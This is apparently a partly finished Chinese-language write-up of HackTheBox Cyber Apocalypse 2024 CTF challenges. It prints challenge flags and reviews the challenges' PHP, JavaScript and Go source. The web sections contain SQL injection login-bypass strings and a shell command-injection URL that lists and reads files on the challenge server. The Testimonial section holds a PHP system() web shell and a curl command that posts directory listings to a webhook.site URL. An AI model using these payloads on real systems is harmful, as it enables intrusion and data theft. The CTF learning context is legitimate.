
Cyber Apocalypse 2024: Hacker Royale writeup
===

# Table of Contents

[TOC]
# HackTheBox CTF
https://ctf.hackthebox.com/event/details/cyber-apocalypse-2024-hacker-royale-1386
![image](https://hackmd.io/_uploads/SkL71gspa.png)
# Misc
![image](https://hackmd.io/_uploads/HyGwxG3pp.png)

## Character
![image](https://hackmd.io/_uploads/Skctgf26a.png)
```command
nc 83.136.252.62 49263
```
![image](https://hackmd.io/_uploads/rkkAgfnTp.png)

### Character Solution
![image](https://hackmd.io/_uploads/ByGFWzh66.png)
> 發現熟悉的 H

![image](https://hackmd.io/_uploads/ByNdVQhTa.png)
![image](https://hackmd.io/_uploads/S1l9EQ3aa.png)
![image](https://hackmd.io/_uploads/SJ0pU72Tp.png)
![image](https://hackmd.io/_uploads/BJkkwX26p.png)
![image](https://hackmd.io/_uploads/SykgPQ3aa.png)

> 寫了一個腳本，無法顯示會應內容(失敗)
> ![image](https://hackmd.io/_uploads/S1Whl43pT.png)

### Get FLAG
> [!CAUTION]
> '1' 'l' 'I' 分不清楚

**FLAG: HTB{tH15_1s_4_r3aLly_l0nG_fL4g_i_h0p3_f0r_y0Ur_s4k3_tH4t_y0U_sCr1pTEd_tH1s_oR_els3_iT_t0oK_qU1t3_l0ng!!}**

## Stop Drop and Roll
![image](https://hackmd.io/_uploads/S12WrN2T6.png)
```command
nc 83.136.249.159 39330
```
![image](https://hackmd.io/_uploads/ryXUHEna6.png)
### Stop Drop and Roll Solution

# Hardware
##  Maze
![image](https://hackmd.io/_uploads/ry243K3T6.png)
### Maze Solution
在 hardware_maze\fs\saveDevice\SavedJobs\InProgress\Factory.pdf中
![image](https://hackmd.io/_uploads/Skbhht36p.png)
![image](https://hackmd.io/_uploads/Skoh3Khpa.png)
### Get FLAG
**FLAG: HTB{1n7323571n9_57uff_1n51d3_4_p21n732}**

# Web
![image](https://hackmd.io/_uploads/ByiU1lsTp.png)

## KORP Terminal
![image](https://hackmd.io/_uploads/SkxYjQVhpT.png)
http://94.237.50.175:34673/
![image](https://hackmd.io/_uploads/Bkn7ME26p.png)

### Attempt
![image](https://hackmd.io/_uploads/BkdqGV36T.png)
> chw/chw

#### ● Log-in
![image](https://hackmd.io/_uploads/HJhofN2ap.png)

#### ● Close connection
![image](https://hackmd.io/_uploads/SkL7m42T6.png)

### TimeKORP Solution
#### 1. or 1=1
![image](https://hackmd.io/_uploads/SytVh_haa.png)
```
' OR 1=1
chw
```
![image](https://hackmd.io/_uploads/HkTIn_36a.png)
> 被reset掉，可能擋1=1

#### 2. or 123=123
![image](https://hackmd.io/_uploads/H1P63O2aT.png)
```
' OR 123=123
chw
```
![image](https://hackmd.io/_uploads/HJxJp_36p.png)
> {"error":{"message":["1064","1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1","42000"],"type":"ProgrammingError"}}

語法有誤 & 系統使用MariaDB

#### 3. OR 123=123 AND password
```
' OR '123'='123' AND password='chw' '--
chw
```
![image](https://hackmd.io/_uploads/BJTwfYnpp.png)


## TimeKORP
![image](https://hackmd.io/_uploads/HyfAW82pT.png)
http://83.136.255.150:45177/
![image](https://hackmd.io/_uploads/Sy91zUhTa.png)
### Attempt
● What's the time?
![image](https://hackmd.io/_uploads/rkryNIna6.png)
> http://83.136.255.150:45177/?format=%H:%M:%S

● What's the date?
![image](https://hackmd.io/_uploads/ryefV8hpp.png)
> http://83.136.255.150:45177/?format=%Y-%m-%d

## Code Review
TimeController.php
```php=
class TimeController
{
    // index 方法處理請求，並使用提供的 Router 實例進行視圖的載入
    public function index($router)
    {
        // 從 GET 請求中獲取時間格式，如果未提供則預設為 '%H:%M:%S'
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';

        // 創建 TimeModel 的實例，並傳遞時間格式參數
        $time = new TimeModel($format);

        // 使用 Router 實例的 view 方法載入視圖，將時間數據傳遞給視圖
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```
時間格式在TimeModel.php
TimeModel.php
```php=
class TimeModel
{
    // 建構子接受時間格式作為參數，並構建要執行的 shell 命令
    public function __construct($format)
    {
        // 使用 date 命令以指定的格式獲取當前時間
        $this->command = "date '+" . $format . "' 2>&1";
    }

    // 獲取格式化後的時間數據
    public function getTime()
    {
        // 執行先前建構的 shell 命令，獲取時間
        $time = exec($this->command);

        // 如果時間存在，將其返回；否則返回問號字串
        $res = isset($time) ? $time : '?';
        return $res;
    }
}

```

> 得知透過shell command 取得當下時間

### TimeKORP Solution
#### 1. Query 注入任何字元測試
```url
http://83.136.255.150:45177/?format=chw
```
![image](https://hackmd.io/_uploads/rkZHN83pa.png)

#### 2. 測試 $_GET['format'] 會不會擋其他不相關字元
```url
http://83.136.250.225:42403/?format=%H:%M:chw
```
![image](https://hackmd.io/_uploads/H154Ydn6a.png)

#### 3. 註解%H:%M:，後面注入command substitution 
```url
http://83.136.250.225:42403/?format=%H:%M:%27;$(ls%20/)%27
```

![image](https://hackmd.io/_uploads/HyMAtdnp6.png)

### Get FLAG
```
http://83.136.250.225:42403/?format=%H:%M:%27;$(cat%20/f*)%27
```
![image](https://hackmd.io/_uploads/BJQ8s_n6p.png)
**FLAG: HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}**

## Flag Command
![image](https://hackmd.io/_uploads/SJqCmY2aT.png)
http://94.237.49.182:48835/
![image](https://hackmd.io/_uploads/BkSeNF3pa.png)
翻譯年糕:
![image](https://hackmd.io/_uploads/rJDX4Y26a.png)
```
>> start
```
![image](https://hackmd.io/_uploads/By9FVt36p.png)

#### PLAY 1
```
HEAD NORTH
```
![image](https://hackmd.io/_uploads/ryhCNtn6p.png)
翻譯年糕
![image](https://hackmd.io/_uploads/BJ9xHKh6p.png)
```
TURN BACK
```
![image](https://hackmd.io/_uploads/r1AQBYnTp.png)

#### PLAY 2
```
HEAD EAST
```
![image](https://hackmd.io/_uploads/HyrtrKha6.png)
```
HEAD EAST
```
一樣的結果
```
HEAD WEST
```
![image](https://hackmd.io/_uploads/HyC2rYnpT.png)

![image](https://hackmd.io/_uploads/SkPnDYh6T.png)

```
HEAD WEST";ls
```
![image](https://hackmd.io/_uploads/HkvkcCTTp.png)

> 被嗆了

![image](https://hackmd.io/_uploads/HyO4vtnp6.png)

### Code review JS 
![image](https://hackmd.io/_uploads/HkqQFFha6.png)
http://94.237.49.182:48835/static/terminal/js/main.js

**main.js**: function CheckMessage()
```javascript=41
async function CheckMessage() {
    fetchingResponse = true;
    currentCommand = commandHistory[commandHistory.length - 1];

    // 檢查使用者輸入的命令是否在可接受的命令列表中
    if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
        // 使用fetch進行HTTP POST請求
        await fetch('/api/monitor', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 'command': currentCommand })
        })
        .then((res) => res.json())
        .then(async (data) => {
            console.log(data)
            await displayLineInTerminal({ text: data.message });

            if(data.message.includes('Game over')) {
                playerLost();
                fetchingResponse = false;
                return;
            }

            if(data.message.includes('HTB{')) {
                playerWon();
                fetchingResponse = false;
                return;
            }

            // 根據不同的命令更新遊戲步驟
            if (currentCommand == 'HEAD NORTH') {
                currentStep = '2';
            }
            else if (currentCommand == 'FOLLOW A MYSTERIOUS PATH') {
                currentStep = '3'
            }
            else if (currentCommand == 'SET UP CAMP') {
                currentStep = '4'
            }

            // 在終端中插入新行，顯示提示和新的命令選項
            let lineBreak = document.createElement("br");
            beforeDiv.parentNode.insertBefore(lineBreak, beforeDiv);
            displayLineInTerminal({ text: '<span class="command">You have 4 options!</span>' })
            displayLinesInTerminal({ lines: availableOptions[currentStep] })
            fetchingResponse = false;
        });
    }
    else {
        // 如果命令不在可接受的命令列表中，顯示錯誤信息
        displayLineInTerminal({ text: "You do realise its not a park where you can just play around and move around pick from options how are hard it is for you????" });
        fetchingResponse = false;
    }
}

```
```javascript=232
// available user commands
export const commandBindings = {
    help: () => {
        displayLinesInTerminal({ lines: HELP });
    },

    start: async () => {
        await displayLineInTerminal({ text: START });
        let lineBreak = document.createElement("br");

        beforeDiv.parentNode.insertBefore(lineBreak, beforeDiv);
        await displayLinesInTerminal({ lines: INITIAL_OPTIONS });
        gameStarted = true;
    },
    clear: () => {
        while (beforeDiv.previousSibling) {
            beforeDiv.previousSibling.remove();
        }
    },

    audio: () => {
        if (playAudio) {
            playAudio = false;
            displayLineInTerminal({ text: "Audio turned off" });
        } else {
            playAudio = true;
            displayLineInTerminal({ text: "Audio turned on" });
        }
    },

    restart: () => {
        let count = 6;

        function updateCounter() {
            count--;

            if (count <= 0) {
                clearInterval(counter);
                return location.reload();
            }

            displayLineInTerminal({
                text: `Game will restart in ${count}...`,
                style: status,
                useTypingEffect: true,
                addPadding: false,
            });
        }

        // execute the code block immediately before starting the interval
        updateCounter();
        currentStep = 1

        let counter = setInterval(updateCounter, 1000);
    },

    info: () => {
        displayLinesInTerminal({ lines: INFO });
    },
};
```

http://94.237.49.121:57333/static/terminal/js/commands.js
command.js
```javascript=
// 在森林中醒來的開始描述
export const START = 'YOU WAKE UP IN A FOREST.';

// 初始遊戲選項，包括一條命令提示和四個方向選項
export const INITIAL_OPTIONS = [
    '<span class="command">You have 4 options!</span>',
    'HEAD NORTH',
    'HEAD SOUTH',
    'HEAD EAST',
    'HEAD WEST'
];

// 遊戲失敗時的描述
export const GAME_LOST =  'You <span class="command error">died</span> and couldn\'t escape the forest. Press <span class="command error">restart</span> to try again.';

// 遊戲獲勝時的描述
export const GAME_WON = 'You <span class="command success">escaped</span> the forest and <span class="command success">won</span> the game! Congratulations! Press <span class="command success">restart</span> to play again.';

// 遊戲信息，提供玩家一些背景故事和情景
export const INFO = [
    "You abruptly find yourself lucid in the middle of a bizarre, alien forest.",
    "How the hell did you end up here?",
    "Eerie, indistinguishable sounds ripple through the gnarled trees, setting the hairs on your neck on edge.",
    "Glancing around, you spot a gangly, grinning figure lurking in the shadows, muttering 'Xclow3n' like some sort of deranged mantra, clearly waiting for you to pass out or something. Creepy much?",
    "Heads up! This forest isn't your grandmother's backyard.",
    "It's packed with enough freaks and frights to make a horror movie blush. Time to find your way out.",
    "The stakes? Oh, nothing big. Just your friends, plunged into an abyss of darkness and despair.",
    "Punch in 'start' to kick things off in this twisted adventure!"
];

// 提供遊戲中的控制指南
export const CONTROLS = [
    "Use the <span class='command'>arrow</span> keys to traverse commands in the command history.",
    "Use the <span class='command'>enter</span> key to submit a command.",
];

// 提供遊戲中的幫助命令列表
export const HELP = [
    '<span class="command help">start</span> Start the game',
    '<span class="command help">clear</span> Clear the game screen',
    '<span class="command help">audio</span> Toggle audio on/off',
    '<span class="command help">restart</span> Restart the game',
    '<span class="command help">info</span> Show info about the game',
]; 

```

### Flag Command Solution

## Testimonial
![image](https://hackmd.io/_uploads/rJPmgeoTa.png)
http://83.136.254.221:48641/
![image](https://hackmd.io/_uploads/SkTSeeiaa.png)

### Attempt
Testimonial:
![image](https://hackmd.io/_uploads/Syy6llipa.png)
> chw/chw

![image](https://hackmd.io/_uploads/B1pJZxip6.png)
> http://83.136.254.221:48641/?testimonial=chw&customer=chw

### Code Review
● client.go
```go=
package client

import (
	"context"
	"fmt"
	"htbchal/pb"
	"strings"
	"sync"

	"google.golang.org/grpc"
)

var (
	grpcClient *Client  // 全域變數，儲存 gRPC 客戶端實例
	mutex      *sync.Mutex  // 互斥鎖，用來確保同一時間僅有一個 goroutine 可以修改 gRPC 客戶端
)

func init() {
	grpcClient = nil
	mutex = &sync.Mutex{}
}

// Client 定義 gRPC 客戶端結構體，內嵌 pb.RickyServiceClient 介面
type Client struct {
	pb.RickyServiceClient
}

// GetClient 用來取得 gRPC 客戶端實例
func GetClient() (*Client, error) {
	mutex.Lock()  // 鎖住互斥鎖，確保同一時間只有一個 goroutine 進入
	defer mutex.Unlock()  // 確保在函數結束時解鎖

	// 如果 gRPC 客戶端還沒有初始化，則進行初始化
	if grpcClient == nil {
		// 透過 gRPC.Dial 來建立到伺服器的連線
		conn, err := grpc.Dial(fmt.Sprintf("127.0.0.1%s", ":50045"), grpc.WithInsecure())
		if err != nil {
			return nil, err
		}

		// 初始化 gRPC 客戶端並將其指派給全域變數
		grpcClient = &Client{pb.NewRickyServiceClient(conn)}
	}

	return grpcClient, nil
}

// SendTestimonial 用來向伺服器發送評論
func (c *Client) SendTestimonial(customer, testimonial string) error {
	ctx := context.Background()
	
	// 過濾掉不合法的字元
	for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
		customer = strings.ReplaceAll(customer, char, "")
	}

	// 使用 gRPC 客戶端向伺服器提交評論
	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}

```

● home.go
```go=
package main

import (
	"htbchal/client"
	"htbchal/view/home"
	"net/http"
)

// HandleHomeIndex 處理首頁的 HTTP 請求
func HandleHomeIndex(w http.ResponseWriter, r *http.Request) error {
	// 從 URL 參數中取得 "customer" 和 "testimonial" 的值
	customer := r.URL.Query().Get("customer")
	testimonial := r.URL.Query().Get("testimonial")

	// 如果 "customer" 和 "testimonial" 都有值
	if customer != "" && testimonial != "" {
		// 取得客戶端（client）
		c, err := client.GetClient()
		if err != nil {
			// 如果取得客戶端發生錯誤，回傳 500 內部伺服器錯誤
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return err
		}

		// 傳送測試評論
		if err := c.SendTestimonial(customer, testimonial); err != nil {
			// 如果傳送評論發生錯誤，回傳 500 內部伺服器錯誤
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return err
		}
	}

	// 渲染首頁，並回傳內容到客戶端
	return home.Index().Render(r.Context(), w)
}
```
● shared.go
```go=
package handler

import (
	"net/http"
)

// MakeHandler 接受一個處理 HTTP 請求的函數 h，返回一個 http.HandlerFunc
func MakeHandler(h func(http.ResponseWriter, *http.Request) error) http.HandlerFunc {
	// 返回一個 http.HandlerFunc，這是一個符合 http.Handler 介面的函數
	return func(w http.ResponseWriter, r *http.Request) {
		// 呼叫傳入的處理函數 h，並檢查是否有錯誤發生
		if err := h(w, r); err != nil {
			// 如果有錯誤，將錯誤信息回應給客戶端，並設置 HTTP 狀態碼為 500 內部伺服器錯誤
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
	}
}
```
### Testimonial Solution
#### 1. 塞入PHP backdoor
Your Testimonial:
```php
"<?php system($_GET['customer']); ?> "
```
Your Name:
```
"$ (curl -X POST 'https://webhook.site/b7887e11-230d-4cac-a3e6-372071c3f2d5' -d "$(ls+..)")"
```
> 不可行

## Labyrinth Linguist
![image](https://hackmd.io/_uploads/Byv1y1CTa.png)\
http://83.136.248.36:46539/
![image](https://hackmd.io/_uploads/r1zXyJCTT.png)

# FINAL
![image](https://hackmd.io/_uploads/B1xMzb90aa.png)
